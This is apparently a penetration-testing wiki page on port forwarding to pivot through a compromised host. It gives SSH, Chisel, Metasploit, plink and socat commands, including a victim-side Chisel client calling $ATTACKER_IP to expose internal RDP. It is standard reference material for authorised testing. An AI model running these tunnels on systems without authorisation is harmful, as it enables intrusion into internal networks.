---
authors: ShutdownRepo, felixbillieres, H4tsuM1ku
category: infra
---

# Port forwarding

## Theory

Port forwarding relays specific ports through a compromised host, allowing access to services on networks not directly reachable from the attacker's position.

**Use when:**
* Only specific services need to be accessed
* Minimal network footprint is desired
* Tools don't support SOCKS proxies

## Practice

### Local port forwarding

Forwards a local port to a remote address through the pivot host.

### Remote port forwarding

Forwards a remote port (on pivot) to a local address, allowing the pivot to access attacker's services.

::: tabs

=== SSH

```bash
# Local port forwarding
ssh -N -L $LOCAL_PORT:$TARGET_HOST:$TARGET_PORT $USER@$PIVOT_HOST

# Example: Access internal web server
ssh -N -L 8080:192.168.1.100:80 $USER@$PIVOT_HOST
# Then access http://localhost:8080

# Remote port forwarding
ssh -N -R $REMOTE_PORT:$TARGET_HOST:$TARGET_PORT $USER@$PIVOT_HOST

# SSH config
Host pivot1
    HostName $PIVOT_HOST
    User $USER
    LocalForward 8080 192.168.1.100:80
    ServerAliveInterval 60
```

> [!TIP]
> For remote port forwarding, ensure `/etc/ssh/sshd_config` has `GatewayPorts yes`.

=== Chisel

```bash
# Attacker machine
chisel server -p $ATTACKER_PORT -reverse

# Victim machine (reverse port forward)
# Format: R:<listen_port>:<target_host>:<target_port>
.\chisel.exe client $ATTACKER_IP:$ATTACKER_PORT R:$PIVOT_LISTEN_PORT:$TARGET_HOST:$TARGET_PORT

# Example: Forward local port 3389 to attacker's port 13389
.\chisel.exe client $ATTACKER_IP:8000 R:13389:localhost:3389
```

=== Metasploit

```bash
# Add port forward
portfwd add -l $LOCAL_PORT -p $TARGET_PORT -r $TARGET_HOST

# List ports forwarded
portfwd list

# Delete port forward
portfwd delete -l $LOCAL_PORT -p $TARGET_PORT -r $TARGET_HOST
```

=== plink (Windows)

```bash
# Local port forwarding
plink.exe -N -L $LOCAL_PORT:$TARGET_HOST:$TARGET_PORT $USER@$PIVOT_HOST -pw $PASSWORD
```

> [!WARNING]
> Using `-pw` stores credentials in clear text. Prefer SSH key authentication.

=== socat

```bash
# Local port forwarding
socat TCP-LISTEN:$LOCAL_PORT,fork,reuseaddr TCP:$TARGET_HOST:$TARGET_PORT
```

:::

### Multi-hop

For multi-hop port forwarding, see [Multi-hop pivoting](../../multi-hop.md#multi-hop-with-port-forwarding).

> [!WARNING]
> Chained port forwarding is complex and error-prone. For multi-hop scenarios, prefer [Ligolo-ng](ligolo-ng.md) or [chained SOCKS proxies](socks-proxy.md).

## Resources

* [Choosing a technique](../choosing-a-technique.md) - When to use port forwarding
* [Multi-hop pivoting](../multi-hop.md) - Multi-hop scenarios
* [Operations](../operations.md) - Using forwarded ports
* [Persistence](../persistence.md) - Maintaining port forwarding access

